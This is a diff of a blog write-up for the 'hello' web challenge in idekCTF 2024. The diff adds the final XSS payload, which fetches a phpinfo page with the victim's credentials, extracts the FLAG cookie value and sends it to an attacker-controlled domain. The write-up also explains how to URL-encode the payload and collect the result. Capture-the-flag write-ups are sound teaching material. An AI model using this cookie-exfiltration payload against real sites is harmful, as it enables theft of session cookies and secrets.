@@ -8,7 +8,7 @@ tags: ["web", "idekctf"]
 
 > Just to warm you up for the next Fight :"D
 
-Challenge files: <!-- todo -->
+Challenge files: [idek-hello.tar.gz](https://nazunacord.net/LOTTMbkwcyak.gz)
 
 We participated in [idekCTF 2024](https://ctf.idek.team/), as extra preparation for [SekaiCTF 2024](https://ctf.sekai.team/), and wow, it is *one hell of a difficult* event. We struggled quite a lot - barely solving a misc challenge, one rev challenge and one web challenge - the one you're reading about now.
 
@@ -30,7 +30,6 @@ Content-Type: text/html; charset=UTF-8
 Date: Sat, 17 Aug 2024 05:48:12 GMT
 Server: nginx/1.27.1
 Transfer-Encoding: chunked
-
 Hello, yes
 ```
 
@@ -202,8 +201,25 @@ fetch("info.php\index.php", { credentials: "include" })
     });
 ```
 
-In the parameter, we have no access to spaces - so we can't really do anything related to variable assignment.
+In the parameter, we have no access to spaces - so we can't really do anything related to variable assignment. Let's make everything a statement.
 
+```js
+fetch("info.php\\index.php", { credentials: "include" })
+    .then(response => response.text())
+    .then(data => {
+        fetch("http:\\\\my.domain\\" + Array.from(document.getElementsByClassName("e")).filter(item => item.innerText === "$_COOKIE['FLAG']")[0].parentElement.children[1].innerText;
+    }).catch(e => document.body.innerHTML = e);
+```
+
+The only thing left we have to do is URL encode it, and pass it into the `name` parameter! Your server under `http://my.domain/` just need to log all paths requested and you should see the flag - URL encoded too of course.
+
+## Conclusion
+
+This wasn't too hard of a web challenge - but it really took a lot of time for me to figure out all the steps and possible vectors. Took me 6 whole hours from like... 10 AM to 4 PM something just to get it done, and I'm genuinely happy about it! I never kicked harder into hyperfocus mode than solving this.
+
+Attached under here is my original draft when I was brainstorming for it...
+
+```md
 ## todo
 - snoop source code
 - query `?name=<string>`, plan is to get xss somehow.
@@ -248,3 +264,6 @@ In the parameter, we have no access to spaces - so we can't really do anything r
             - dump `info.php` to current document
             - fetch flag from the html
             - send a request back to a server
+```
+
+Now excuse me, I need a huge nap to recover from all this.
